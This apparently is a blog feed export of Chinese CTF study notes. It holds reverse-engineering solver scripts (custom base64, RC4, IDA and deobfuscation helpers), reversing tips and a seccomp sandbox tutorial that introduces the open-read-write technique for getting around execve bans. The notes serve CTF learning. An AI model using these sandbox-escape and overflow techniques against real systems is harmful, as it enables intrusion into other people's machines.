class="number">1</span>]-<span class="number">0x3D</span>)&amp;<span class="number">0x30</span>)&gt;&gt;<span class="number">4</span>))+<span class="string">&#x27;,&#x27;</span></span><br><span class="line">    flag+=<span class="built_in">hex</span>((((data[i+<span class="number">1</span>]-<span class="number">0x3D</span>)&amp;<span class="number">0x0F</span>)&lt;&lt;<span class="number">4</span>)|(((data[i+<span class="number">2</span>]-<span class="number">0x3D</span>)&amp;<span class="number">0x3C</span>)&gt;&gt;<span class="number">2</span>))+<span class="string">&#x27;,&#x27;</span></span><br><span class="line">    flag+=<span class="built_in">hex</span>(((data[i+<span class="number">3</span>]-<span class="number">0x3D</span>)&amp;<span class="number">0x3F</span>)|((data[i+<span class="number">2</span>]-<span class="number">0x3D</span>)&amp;<span class="number">0x03</span>)&lt;&lt;<span class="number">6</span>)+<span class="string">&#x27;,&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>



<h2 id="mfc事件处理时-写个程序向MFC程序发送这个消息"><a href="#mfc事件处理时-写个程序向MFC程序发送这个消息" class="headerlink" title="mfc事件处理时(写个程序向MFC程序发送这个消息)"></a>mfc事件处理时(写个程序向MFC程序发送这个消息)</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#include&lt;Windows.h&gt;</span></span><br><span class="line"><span class="comment">#include&lt;stdio.h&gt;</span></span><br><span class="line"><span class="built_in">int</span> main()</span><br><span class="line">&#123;</span><br><span class="line">	HWND h = FindWindowA(NULL, <span class="string">&quot;Flag就在控件里&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span> (h)</span><br><span class="line">	&#123;</span><br><span class="line">		SendMessage(h, <span class="number">0x0464</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">		printf(<span class="string">&quot;success&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> printf(<span class="string">&quot;failure&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<h2 id="base64换码表的解题代码"><a href="#base64换码表的解题代码" class="headerlink" title="base64换码表的解题代码"></a>base64换码表的解题代码</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode </span><br><span class="line">miwen=<span class="string">&quot;_r-+_Cl5;vgq_pdme7#7eC0=&quot;</span></span><br><span class="line">key1=<span class="built_in">list</span>(<span class="string">&quot;@,.1fgvw#`/2ehux$~\&quot;3dity%_;4cjsz^+&#123;5bkrA&amp;=&#125;6alqB*-[70mpC()]89noD&quot;</span>)	</span><br><span class="line">base64=<span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span></span><br><span class="line">secret=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> miwen:</span><br><span class="line">	k=key1.index(i)</span><br><span class="line">	secret+=base64[k]</span><br><span class="line"><span class="built_in">print</span>(secret)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(secret))</span><br><span class="line"><span class="built_in">print</span>(b64decode(secret))</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">str1 = <span class="string">&quot;x2dtJEOmyjacxDemx2eczT5cVS9fVUGvWTuZWjuexjRqy24rV29q&quot;</span></span><br><span class="line"></span><br><span class="line">string1 = <span class="string">&quot;ZYXABCDEFGHIJKLMNOPQRSTUVWzyxabcdefghijklmnopqrstuvw0123456789+/&quot;</span></span><br><span class="line">string2 = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> (base64.b64decode(str1.translate(<span class="built_in">str</span>.maketrans(string1,string2))))</span><br></pre></td></tr></table></figure>



<h2 id="先用base64解密，再用rc4解密"><a href="#先用base64解密，再用rc4解密" class="headerlink" title="先用base64解密，再用rc4解密"></a>先用base64解密，再用rc4解密</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> ARC4</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc4_decrypt</span>(<span class="params">key, data</span>):</span><br><span class="line">    cipher = ARC4.new(key)</span><br><span class="line">    <span class="keyword">return</span> cipher.decrypt(data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decode_base64_and_rc4</span>(<span class="params">base64_data, key</span>):</span><br><span class="line">    <span class="comment"># 确保Base64字符串长度是4的倍数，添加必要的填充</span></span><br><span class="line">    missing_padding = <span class="built_in">len</span>(base64_data) % <span class="number">4</span></span><br><span class="line">    <span class="keyword">if</span> missing_padding:</span><br><span class="line">        base64_data += <span class="string">&#x27;=&#x27;</span> * (<span class="number">4</span> - missing_padding)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 解码Base64编码的数据</span></span><br><span class="line">        decoded_data = base64.b64decode(base64_data)</span><br><span class="line">        <span class="comment"># 使用RC4解密</span></span><br><span class="line">        decrypted_data = rc4_decrypt(key, decoded_data)</span><br><span class="line">        <span class="keyword">return</span> decrypted_data</span><br><span class="line">    <span class="keyword">except</span> (base64.binascii.Error, Exception) <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;An error occurred during decoding or decrypting: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># 示例Base64编码的RC4加密数据（你需要替换为你自己的数据）</span></span><br><span class="line">    base64_encrypted_data = <span class="string">&quot;HcWAX+cMWAaxnh09eD+FdqaXiQ/ijIRVxlvEVgK78rpxoxbBeKYhpwSWKQ&quot;</span></span><br><span class="line">    <span class="comment"># RC4加密使用的密钥（你需要替换为你自己的密钥）</span></span><br><span class="line">    encryption_key = <span class="string">&quot;flag&#123;123321321123badbeef012&#125;&quot;</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>)  <span class="comment"># 转换为字节类型</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 解码并解密数据</span></span><br><span class="line">    result = decode_base64_and_rc4(base64_encrypted_data, encryption_key)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> result <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># 尝试解码为UTF-8字符串，并打印结果</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Decrypted data:&quot;</span>, result.decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">        <span class="keyword">except</span> UnicodeDecodeError:</span><br><span class="line">            <span class="comment"># 如果解密后的内容不是有效的UTF-8编码，则以十六进制格式打印原始字节</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Decrypted data (hex):&quot;</span>, result.<span class="built_in">hex</span>())</span><br></pre></td></tr></table></figure>



<h2 id="Fuck混淆解码脚本："><a href="#Fuck混淆解码脚本：" class="headerlink" title="Fuck混淆解码脚本："></a>Fuck混淆解码脚本：</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">deEquation</span>(<span class="params">str</span>) &#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt;= <span class="number">1</span>; i++) &#123;</span><br><span class="line">  str = str.<span class="title function_">replace</span>(<span class="regexp">/l\[(\D*?)](\+l|-l|==)/g</span>, <span class="function">(<span class="params">m, a, b</span>) =&gt;</span> <span class="string">&#x27;l[&#x27;</span> + <span class="built_in">eval</span>(a) + <span class="string">&#x27;]&#x27;</span> + b);</span><br><span class="line">  &#125;</span><br><span class="line">  str = str.<span class="title function_">replace</span>(<span class="regexp">/==(\D*?)&amp;&amp;/g</span>, <span class="function">(<span class="params">m, a</span>) =&gt;</span> <span class="string">&#x27;==&#x27;</span> + <span class="built_in">eval</span>(a) + <span class="string">&#x27;&amp;&amp;&#x27;</span>);</span><br><span class="line">  <span class="keyword">return</span> str;</span><br><span class="line">&#125;</span><br><span class="line">s=<span class="string">&quot;..........&quot;</span>;</span><br><span class="line">ss=<span class="title function_">deEquation</span>(s);</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">write</span>(ss);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>



<h2 id="IDA的get-wide-dword的使用"><a href="#IDA的get-wide-dword的使用" class="headerlink" title="IDA的get_wide_dword的使用"></a>IDA的get_wide_dword的使用</h2><p>第一种:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> idaapi</span><br><span class="line"></span><br><span class="line">addr = <span class="number">0x6020c0</span></span><br><span class="line">list1 = []</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算元素数量</span></span><br><span class="line">num_elements = (<span class="number">0x60213c</span> - addr) // <span class="number">4</span>  <span class="comment"># 使用整数除法</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(num_elements):</span><br><span class="line">    value = idaapi.get_wide_dword(addr + <span class="number">4</span>*i)</span><br><span class="line">    list1.append(value)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(list1)</span><br></pre></td></tr></table></figure>

<p>第二种：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> ida_bytes <span class="keyword">import</span> get_wide_dword</span><br><span class="line"></span><br><span class="line">addr = <span class="number">0x435dc0</span></span><br><span class="line">list1 = [get_wide_dword(addr + <span class="number">4</span> * i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">14</span>)]</span><br><span class="line"><span class="built_in">print</span>(list1)</span><br><span class="line"></span><br><span class="line">addr2 = <span class="number">0x435df8</span></span><br><span class="line">list2 = [get_wide_dword(addr2 + <span class="number">4</span> * i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">14</span>)]</span><br><span class="line"><span class="built_in">print</span>(list2)</span><br><span class="line"></span><br><span class="line">addr3 = <span class="number">0x435e30</span></span><br><span class="line">list3 = [get_wide_dword(addr3 + <span class="number">4</span> * i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">14</span>)]</span><br><span class="line"><span class="built_in">print</span>(list3)</span><br></pre></td></tr></table></figure>



<h2 id="mov混淆的ida脚本"><a href="#mov混淆的ida脚本" class="headerlink" title="mov混淆的ida脚本"></a>mov混淆的ida脚本</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> idaapi</span><br><span class="line"><span class="keyword">import</span> ida_bytes</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_flag</span>(<span class="params">start, end</span>):</span><br><span class="line">    flag = <span class="string">&quot;&quot;</span></span><br><span class="line">    current = start</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> current &lt; end:</span><br><span class="line">        byte = ida_bytes.get_byte(current)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> ((<span class="number">48</span> &lt;= byte &lt;= <span class="number">57</span>) <span class="keyword">or</span>  <span class="comment"># &#x27;0&#x27;-&#x27;9&#x27;</span></span><br><span class="line">            (<span class="number">65</span> &lt;= byte &lt;= <span class="number">90</span>) <span class="keyword">or</span>  <span class="comment"># &#x27;A&#x27;-&#x27;Z&#x27;</span></span><br><span class="line">            (<span class="number">97</span> &lt;= byte &lt;= <span class="number">122</span>) <span class="keyword">or</span> <span class="comment"># &#x27;a&#x27;-&#x27;z&#x27;</span></span><br><span class="line">            byte <span class="keyword">in</span> [<span class="number">33</span>, <span class="number">64</span>, <span class="number">35</span>, <span class="number">123</span>, <span class="number">125</span>, <span class="number">39</span>, <span class="number">42</span>, <span class="number">38</span>, <span class="number">95</span>]):  <span class="comment"># &#x27;!&#x27;, &#x27;@&#x27;, &#x27;#&#x27;, &#x27;&#123;&#x27;, &#x27;&#125;&#x27;, &#x27;\&#x27;&#x27;, &#x27;*&#x27;, &#x27;&amp;&#x27;, &#x27;_&#x27;</span></span><br><span class="line">            </span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (ida_bytes.get_byte(current + <span class="number">1</span>) == <span class="number">0</span> <span class="keyword">and</span> </span><br><span class="line">                ida_bytes.get_byte(current + <span class="number">2</span>) == <span class="number">0</span> <span class="keyword">and</span> </span><br><span class="line">                ida_bytes.get_byte(current + <span class="number">3</span>) == <span class="number">0</span>):</span><br><span class="line">                flag += <span class="built_in">chr</span>(byte)</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">        current += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">start_address = <span class="number">0x80487c4</span></span><br><span class="line">end_address = <span class="number">0x8060B38</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag = find_flag(start_address, end_address)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Found flag: <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>



<h2 id="两个EzJar-class文件，手工切出解压"><a href="#两个EzJar-class文件，手工切出解压" class="headerlink" title="两个EzJar.class文件，手工切出解压"></a>两个EzJar.class文件，手工切出解压</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line">inflator = zlib.decompressobj(-zlib.MAX_WBITS)</span><br><span class="line">f=<span class="built_in">open</span>(<span class="string">&#x27;&quot;D:\\桌面\\attachment\\EzJar\\EzJar.class\\EzJar.java&quot;&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">f.seek(<span class="number">659</span>)</span><br><span class="line">a=f.read(<span class="number">3248</span>)</span><br><span class="line">f.close()</span><br><span class="line">x = inflator.decompress(a)</span><br><span class="line">f=<span class="built_in">open</span>(<span class="string">&#x27;EzJar.class&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">f.write(x)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>reverse</category>
        <category>总结</category>
        <category>re部分模板</category>
      </categories>
  </entry>
  <entry>
    <title>re部分解题信息(持续更新)</title>
    <url>/2025/02/26/re%E9%83%A8%E5%88%86%E8%A7%A3%E9%A2%98%E4%BF%A1%E6%81%AF-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/</url>
    <content><![CDATA[<h3 id="一"><a href="#一" class="headerlink" title="一"></a>一</h3><p>unity游戏的核心逻辑一般位于assets\bin\Data\Managed\Assembly-CSharp.dll</p>
<h3 id="二"><a href="#二" class="headerlink" title="二"></a>二</h3><p>strcpy(Destination, Source);<br>strcpy(x, Source);<br>栈溢出的类型，先用x找到溢出的地址</p>
<h3 id="三"><a href="#三" class="headerlink" title="三"></a>三</h3><p>UnDecorateSymbolName()函数：<br>该函数第一个参数为输出地址、第二个参数为未修饰的名字、第三个参数为长度、第四个参数为0表示完全修饰；<br>以下所有资料摘自：<a href="https://blog.csdn.net/liweigao01/article/details/78351464">https://blog.csdn.net/liweigao01/article/details/78351464</a><br>资料一：<br>无论 __cdecl，__fastcall还是__stdcall调用方式，函数修饰都是以一个“?”開始，后面紧跟函数的名字。<br>再后面是參数表的開始标识和 依照參数类型代号拼出的參数表。<br>资料二：<br>对于C++的类成员函数（其调用方式是thiscall）。<br>函数的名字修饰与非成员的C++函数稍有不同，首先就是在函数名字和參数表之间插入以“@”字 符引导的类名。<br>资料三：</p>
<p>其次是參数表的開始标识不同，公有（public）成员函数的标识是“@@QAE”,保护（protected）成员函数的标识是 “@@IAE”,私有（private）成员函数的标识是“@@AAE”，<br>假设函数声明使用了constkeyword，则对应的标识应分别为 “@@QBE”，“@@IBE”和“@@ABE”。</p>
<p>资料四：<br>參数表的拼写代号例如以下所看到的：<br>X–void<br>D–char<br>E–unsigned char<br>F–short<br>H–int<br>I–unsigned int<br>J–long<br>K–unsigned long（DWORD）<br>M–float<br>N–double<br>_N–bool<br>U–struct<br>….<br>指针的方式有些特别。用PA表示指针，用PB表示const类型的指针。</p>
<h3 id="四"><a href="#四" class="headerlink" title="四"></a>四</h3><p>dword 是双字，4个才是一个数据，所以当你用IDA时要用，initialized C variable。</p>
<h3 id="五"><a href="#五" class="headerlink" title="五"></a>五</h3><p>.d文件是一种D语言的源码，flag有可能就在d文件里</p>
]]></content>
      <categories>
        <category>reverse</category>
        <category>总结</category>
        <category>re部分解题信息</category>
      </categories>
  </entry>
  <entry>
    <title>sandbox专题学习</title>
    <url>/2025/06/29/sandbox%E4%B8%93%E9%A2%98%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h2 id="sandbox专题学习"><a href="#sandbox专题学习" class="headerlink" title="sandbox专题学习"></a>sandbox专题学习</h2><p>刚刚学完栈迁移📚，发现 sandbox 🧱经常和栈迁移结合，于是就仔细学一下 sandbox 🤓！</p>
<p>💻 Sandbox绕过好像很多，也复杂 😤，这里只好记录一下ORW的学习 📝</p>
<h3 id="orw"><a href="#orw" class="headerlink" title="orw"></a>orw</h3><h4 id="什么时候用orw"><a href="#什么时候用orw" class="headerlink" title="什么时候用orw"></a>什么时候用orw</h4><p>当程序开启沙箱保护，禁用一些系统调用，禁用execve等，使得我们不能通过使用system和execve来getshell。此时我们就要用到orw来解决这些问题。</p>
<h4 id="orw是什么"><a href="#orw是什么" class="headerlink" title="orw是什么"></a>orw是什么</h4><p>orw就是open,read,write这三个函数的简写，打开flag,读取flag,写出flag通过这三步来得到flag。</p>
<h4 id="sandbox的开启"><a href="#sandbox的开启" class="headerlink" title="sandbox的开启"></a>sandbox的开启</h4><p>第一种是利用prctl(),第二种是利用seccomp的库函数</p>
<p>(1) prctl():</p>
<p>在 Linux 系统编程中，<code>prctl</code> 函数结合 <code>PR_SET_SECCOMP</code> 或 <code>PR_SET_NO_NEW_PRIVS</code> 标志可用于开启 <strong>seccomp（Secure Computing）沙箱</strong>，这是一种限制进程系统调用（syscall）的安全机制。</p>
<p>PR_SET_NO_NEW_PRIVS:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0); #禁止进程及其子进程通过 execve 等获得新权限</span><br></pre></td></tr></table></figure>

<p>PR_SET_SECCOMP:</p>
<p>严格模式<strong>（<code>SECCOMP_MODE_STRICT</code>）</strong>：仅允许 <code>read</code>, <code>write</code>, <code>_exit</code>, <code>sigreturn</code> 四个系统调用。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">prctl(PR_SET_SECCOMP, SECCOMP_MODE_STRICT);</span><br></pre></td></tr></table></figure>

<p>过滤器模式（<code>SECCOMP_MODE_FILTER</code>）：自定义允许&#x2F;拒绝的系统调用列表（通过 BPF 规则）。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">struct sock_fprog filter = &#123; ... &#125;;  // 定义 BPF 过滤器</span><br><span class="line">prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &amp;filter);</span><br></pre></td></tr></table></figure>

<p>例子：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sock_filter</span> <span class="title">filter</span>[] =</span> &#123;</span><br><span class="line">    <span class="comment">// 检查系统调用号是否在允许列表</span></span><br><span class="line">    BPF_STMT(BPF_LD | BPF_W | BPF_ABS, offsetof(<span class="keyword">struct</span> seccomp_data, nr)),</span><br><span class="line">    BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, __NR_openat, <span class="number">0</span>, <span class="number">1</span>), <span class="comment">// 允许 openat</span></span><br><span class="line">    BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),</span><br><span class="line">    BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, __NR_read, <span class="number">0</span>, <span class="number">1</span>),   <span class="comment">// 允许 read</span></span><br><span class="line">    BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),</span><br><span class="line">    BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_KILL),            <span class="comment">// 拒绝其他</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sock_fprog</span> <span class="title">prog</span> =</span> &#123;</span><br><span class="line">    .len = <span class="keyword">sizeof</span>(filter) / <span class="keyword">sizeof</span>(filter[<span class="number">0</span>]),</span><br><span class="line">    .filter = filter,</span><br><span class="line">&#125;;   </span><br><span class="line"><span class="comment">//SECCOMP_RET_ALLOW：允许系统调用。</span></span><br><span class="line"><span class="comment">//SECCOMP_RET_KILL：立即终止进程。</span></span><br></pre></td></tr></table></figure>

<p>(2)seccomp的库函数:例如libseccomp 库</p>
<p>例子：仅允许进程执行 <code>exit_group</code>、<code>read</code>、<code>write</code> 系统调用：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;seccomp.h&gt;</span></span></span><br><span class="line">scmp_filter_ctx ctx = seccomp_init(SCMP_ACT_KILL); <span class="comment">// 默认拒绝所有</span></span><br><span class="line">seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), <span class="number">0</span>);</span><br><span class="line">seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), <span class="number">0</span>);</span><br><span class="line">seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), <span class="number">0</span>);</span><br><span class="line">seccomp_load(ctx); <span class="comment">// 加载到内核</span></span><br></pre></td></tr></table></figure>



<p>了解完这些，就开始学习如何解决它了(orw)</p>
<h4 id="seccomp-tools查看沙箱"><a href="#seccomp-tools查看沙箱" class="headerlink" title="seccomp-tools查看沙箱"></a>seccomp-tools查看沙箱</h4><p>seccomp-tools可以用来查看沙箱的情况</p>
<p>安装：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt install gcc ruby-dev</span><br><span class="line">sudo gem install seccomp-tools</span><br><span class="line">seccomp-tools dump ./elf  #elf换成你自己的文件名</span><br></pre></td></tr></table></figure>

<p><img src="/2025/06/29/sandbox%E4%B8%93%E9%A2%98%E5%AD%A6%E4%B9%A0/s-tools1.png" alt="1"></p>
<p>可以看到那些函数是可以用的。</p>
<h3 id="open、read、write函数的了解"><a href="#open、read、write函数的了解" class="headerlink" title="open、read、write函数的了解"></a>open、read、write函数的了解</h3><p>open()函数：</p>
<p>函数原型</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">open</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *pathname, <span class="type">int</span> flags)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">open</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *pathname, <span class="type">int</span> flags, <span class="type">mode_t</span> mode)</span>;</span><br></pre></td></tr></table></figure>

<ol>
<li><p><code>pathname</code></p>
<p>：</p>
<ul>
<li>文件路径名（字符串），例如：<code>&quot;flag&quot;</code>、<code>&quot;/tmp/test.txt&quot;</code>。</li>
</ul>
</li>
<li><p><code>flags</code></p>
<p>：</p>
<ul>
<li>打开文件的方式，比如只读、只写、读写等。</li>
<li>可以组合多个标志（使用按位或 <code>|</code> 操作符）。</li>
</ul>
<table>
<thead>
<tr>
<th>标志常量</th>
<th>十六进制值</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td><code>O_RDONLY</code></td>
<td>0x0</td>
<td>只读方式打开文件</td>
</tr>
<tr>
<td><code>O_WRONLY</code></td>
<td>0x1</td>
<td>只写方式打开文件</td>
</tr>
<tr>
<td><code>O_RDWR</code></td>
<td>0x2</td>
<td>读写方式打开文件</td>
</tr>
</tbody></table>
<p>系统调用号：</p>
<ul>
<li><code>sys_open</code> 的系统调用号是 <code>5</code>（十进制），即 <code>0x5</code>。</li>
</ul>
<table>
<thead>
<tr>
<th>关键点</th>
<th>内容</th>
</tr>
</thead>
<tbody><tr>
<td>函数名</td>
<td><code>open()</code></td>
</tr>
<tr>
<td>功能</td>
<td>打开或创建文件</td>
</tr>
<tr>
<td>返回值</td>
<td>文件描述符（成功）或 -1（失败）</td>
</tr>
<tr>
<td>常用 flag</td>
<td><code>O_RDONLY</code>, <code>O_WRONLY</code>, <code>O_RDWR</code>, <code>O_CREAT</code>, <code>O_TRUNC</code>, <code>O_APPEND</code></td>
</tr>
<tr>
<td>mode 参数</td>
<td>用于指定新文件权限，如 <code>0644</code></td>
</tr>
<tr>
<td>系统调用号</td>
<td><code>5</code>（Linux x86）</td>
</tr>
<tr>
<td>寄存器传参</td>
<td><code>eax=5</code>, <code>ebx=filename</code>, <code>ecx=flags</code>, <code>edx=mode</code></td>
</tr>
</tbody></table>
</li>
</ol>
<p>read()函数：</p>
<p>函数原型：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">ssize_t</span> <span class="title function_">read</span><span class="params">(<span class="type">int</span> fd, <span class="type">void</span> *buf, <span class="type">size_t</span> count)</span>;</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>参数名</th>
<th>类型</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td><code>fd</code></td>
<td><code>int</code></td>
<td>文件描述符（由 <code>open()</code> 或其他方式获得）</td>
</tr>
<tr>
<td><code>buf</code></td>
<td><code>void*</code></td>
<td>用户空间的缓冲区地址，用来保存读取的数据</td>
</tr>
<tr>
<td><code>count</code></td>
<td><code>size_t</code></td>
<td>要读取的最大字节数</td>
</tr>
</tbody></table>
<p>系统调用号：</p>
<ul>
<li><code>sys_read</code> 的系统调用号是 <code>3</code>（十进制），即 <code>0x3</code>。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">寄存器传参方式（Linux x86）：</span><br><span class="line">寄存器	对应参数</span><br><span class="line">eax	系统调用号：3</span><br><span class="line">ebx	文件描述符 fd</span><br><span class="line">ecx	缓冲区地址 buf</span><br><span class="line">edx	要读取的字节数 count</span><br></pre></td></tr></table></figure>

<p>write()函数:</p>
<p>函数原型：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">ssize_t</span> <span class="title function_">write</span><span class="params">(<span class="type">int</span> fd, <span class="type">const</span> <span class="type">void</span> *buf, <span class="type">size_t</span> count)</span>;</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>参数名</th>
<th>类型</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td><code>fd</code></td>
<td><code>int</code></td>
<td>文件描述符（由 <code>open()</code> 或其他方式获得）</td>
</tr>
<tr>
<td><code>buf</code></td>
<td><code>const void*</code></td>
<td>用户空间的缓冲区地址，包含要写入的数据</td>
</tr>
<tr>
<td><code>count</code></td>
<td><code>size_t</code></td>
<td>要写入的最大字节数</td>
</tr>
</tbody></table>
<p>系统调用号：</p>
<ul>
<li><code>sys_write</code> 的系统调用号是 <code>4</code>（十进制），即 <code>0x4</code>。</li>
</ul>
<p>寄存器传参方式（Linux x86）：</p>
<table>
<thead>
<tr>
<th>寄存器</th>
<th>对应参数</th>
</tr>
</thead>
<tbody><tr>
<td><code>eax</code></td>
<td>系统调用号：<code>4</code></td>
</tr>
<tr>
<td><code>ebx</code></td>
<td>文件描述符 <code>fd</code></td>
</tr>
<tr>
<td><code>ecx</code></td>
<td>缓冲区地址 <code>buf</code></td>
</tr>
<tr>
<td><code>edx</code></td>
<td>要写入的字节数 <code>count</code></td>
</tr>
</tbody></table>
<h4 id="做完了铺垫，现在就开始orw"><a href="#做完了铺垫，现在就开始orw" class="headerlink" title="做完了铺垫，现在就开始orw"></a>做完了铺垫，现在就开始orw</h4><h5 id="shellcode绕过"><a href="#shellcode绕过" class="headerlink" title="shellcode绕过"></a>shellcode绕过</h5><p>首先,看看最简单的orw,在没有开启NX的条件下，可以直接写入这三个函数执行。</p>
<p><img src="/2025/06/29/sandbox%E4%B8%93%E9%A2%98%E5%AD%A6%E4%B9%A0/%E4%BE%8B1.0.png" alt="2"></p>
<p>第一种直接用汇编写</p>
